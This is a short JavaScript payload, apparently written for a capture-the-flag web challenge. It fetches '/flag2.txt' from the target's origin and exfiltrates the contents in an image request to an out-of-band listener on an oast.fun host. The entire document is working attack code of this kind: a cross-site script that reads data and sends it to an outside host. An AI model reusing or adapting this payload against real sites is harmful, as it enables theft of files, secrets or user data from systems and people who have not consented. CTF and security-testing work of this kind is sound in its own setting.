(async()=>{
    // fetch the flag file off the local filesystem
    const txt = await (await fetch('/flag2.txt')).text();
    // exfiltrate it as a GET to your listener
    new Image().src = 'https://nntdfrlpiazffctldarunhkvwn0hvbn8v.oast.fun/?flag=' + encodeURIComponent(txt);
  })();
